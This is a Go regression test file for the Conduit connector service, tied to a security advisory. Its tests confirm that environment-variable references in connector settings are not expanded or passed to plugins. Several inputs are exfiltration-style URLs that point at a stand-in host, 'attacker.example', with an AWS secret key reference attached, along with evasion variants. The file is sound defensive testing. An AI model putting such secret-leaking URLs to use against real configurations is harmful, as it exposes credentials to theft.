// Copyright © 2026 Meroxa, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package connector

import (
	"context"
	"strings"
	"testing"

	"github.com/conduitio/conduit-connector-protocol/pconnector"
	"github.com/conduitio/conduit/pkg/foundation/cerrors/conduiterr"
	"github.com/matryer/is"
	"go.uber.org/mock/gomock"
)

// These tests are the C2a regression for the connector configure path
// (GHSA-m3mw-fpw8-w765). They use only the Service-less default wiring, which
// must fail closed: a ${VAR} reference in a setting never reaches the plugin
// expanded, whatever the process environment holds.

const secretValue = "AKIA-super-secret-value"

func TestSource_Configure_DoesNotExpandEnv(t *testing.T) {
	for name, setting := range map[string]string{
		"plain reference":      "http://attacker.example/x?k=${AWS_SECRET_ACCESS_KEY}",
		"bare reference":       "http://attacker.example/x?k=$AWS_SECRET_ACCESS_KEY",
		"default syntax":       "${AWS_SECRET_ACCESS_KEY:-x}",
		"nested":               "${${AWS_SECRET_ACCESS_KEY}}",
		"inside a longer text": "a-${AWS_SECRET_ACCESS_KEY}-b",
	} {
		t.Run(name, func(t *testing.T) {
			is := is.New(t)
			ctx := context.Background()
			t.Setenv("AWS_SECRET_ACCESS_KEY", secretValue)

			src, sourceMock := newTestSource(ctx, t, gomock.NewController(t))
			src.Instance.Config.Settings = map[string]string{"url": setting}

			var seen []map[string]string
			sourceMock.EXPECT().Configure(gomock.Any(), gomock.Any()).
				DoAndReturn(func(_ context.Context, req pconnector.SourceConfigureRequest) (pconnector.SourceConfigureResponse, error) {
					seen = append(seen, req.Config)
					return pconnector.SourceConfigureResponse{}, nil
				}).AnyTimes()
			sourceMock.EXPECT().Teardown(gomock.Any(), gomock.Any()).Return(pconnector.SourceTeardownResponse{}, nil).AnyTimes()
			sourceMock.EXPECT().Open(gomock.Any(), gomock.Any()).Return(pconnector.SourceOpenResponse{}, nil).AnyTimes()
			sourceMock.EXPECT().LifecycleOnCreated(gomock.Any(), gomock.Any()).Return(pconnector.SourceLifecycleOnCreatedResponse{}, nil).AnyTimes()

			err := src.Open(ctx)

			for _, cfg := range seen {
				for k, v := range cfg {
					is.True(!strings.Contains(v, secretValue)) // setting "k" must not carry the secret to the plugin
					_ = k
				}
			}
			is.True(err != nil) // a refused reference fails the connector
			ce, ok := conduiterr.Get(err)
			is.True(ok)
			is.True(strings.HasPrefix(ce.Code.Reason(), "config.env_")) // coded, not an opaque error
			is.True(!strings.Contains(err.Error(), secretValue))
		})
	}
}

func TestDestination_Configure_DoesNotExpandEnv(t *testing.T) {
	is := is.New(t)
	ctx := context.Background()
	t.Setenv("AWS_SECRET_ACCESS_KEY", secretValue)

	dest, destMock := newTestDestination(ctx, t, gomock.NewController(t))
	dest.Instance.Config.Settings = map[string]string{"url": "http://attacker.example/x?k=${AWS_SECRET_ACCESS_KEY}"}

	var seen []map[string]string
	destMock.EXPECT().Configure(gomock.Any(), gomock.Any()).
		DoAndReturn(func(_ context.Context, req pconnector.DestinationConfigureRequest) (pconnector.DestinationConfigureResponse, error) {
			seen = append(seen, req.Config)
			return pconnector.DestinationConfigureResponse{}, nil
		}).AnyTimes()
	destMock.EXPECT().Teardown(gomock.Any(), gomock.Any()).Return(pconnector.DestinationTeardownResponse{}, nil).AnyTimes()
	destMock.EXPECT().Open(gomock.Any(), gomock.Any()).Return(pconnector.DestinationOpenResponse{}, nil).AnyTimes()
	destMock.EXPECT().LifecycleOnCreated(gomock.Any(), gomock.Any()).Return(pconnector.DestinationLifecycleOnCreatedResponse{}, nil).AnyTimes()

	err := dest.Open(ctx)

	for _, cfg := range seen {
		for _, v := range cfg {
			is.True(!strings.Contains(v, secretValue)) // the secret must not reach the plugin
		}
	}
	is.True(err != nil)
	ce, ok := conduiterr.Get(err)
	is.True(ok)
	is.True(strings.HasPrefix(ce.Code.Reason(), "config.env_"))
}

// Lifecycle events must not hand a plugin settings that Configure would refuse:
// OnDelete used to send the raw stored text, references and paths nobody had
// vetted. With the default (fail-closed) resolver a ${VAR} reference is refused,
// so the delete hook must not reach the plugin carrying it.
func TestSource_OnDelete_DoesNotCarryRawSettings(t *testing.T) {
	is := is.New(t)
	ctx := context.Background()
	t.Setenv("AWS_SECRET_ACCESS_KEY", secretValue)

	src, sourceMock := newTestSource(ctx, t, gomock.NewController(t))
	src.Instance.LastActiveConfig.Settings = map[string]string{"url": "http://attacker.example/?k=${AWS_SECRET_ACCESS_KEY}"}

	var events []map[string]string
	sourceMock.EXPECT().LifecycleOnDeleted(gomock.Any(), gomock.Any()).
		DoAndReturn(func(_ context.Context, req pconnector.SourceLifecycleOnDeletedRequest) (pconnector.SourceLifecycleOnDeletedResponse, error) {
			events = append(events, req.Config)
			return pconnector.SourceLifecycleOnDeletedResponse{}, nil
		}).AnyTimes()
	sourceMock.EXPECT().Teardown(gomock.Any(), gomock.Any()).Return(pconnector.SourceTeardownResponse{}, nil).AnyTimes()

	err := src.OnDelete(ctx)

	is.True(err != nil)
	is.Equal(len(events), 0) // the plugin must not receive the unvetted settings
}

func TestDestination_OnDelete_DoesNotCarryRawSettings(t *testing.T) {
	is := is.New(t)
	ctx := context.Background()
	t.Setenv("AWS_SECRET_ACCESS_KEY", secretValue)

	dest, destMock := newTestDestination(ctx, t, gomock.NewController(t))
	dest.Instance.LastActiveConfig.Settings = map[string]string{"url": "http://attacker.example/?k=${AWS_SECRET_ACCESS_KEY}"}

	var events []map[string]string
	destMock.EXPECT().LifecycleOnDeleted(gomock.Any(), gomock.Any()).
		DoAndReturn(func(_ context.Context, req pconnector.DestinationLifecycleOnDeletedRequest) (pconnector.DestinationLifecycleOnDeletedResponse, error) {
			events = append(events, req.Config)
			return pconnector.DestinationLifecycleOnDeletedResponse{}, nil
		}).AnyTimes()
	destMock.EXPECT().Teardown(gomock.Any(), gomock.Any()).Return(pconnector.DestinationTeardownResponse{}, nil).AnyTimes()

	err := dest.OnDelete(ctx)

	is.True(err != nil)
	is.Equal(len(events), 0)
}
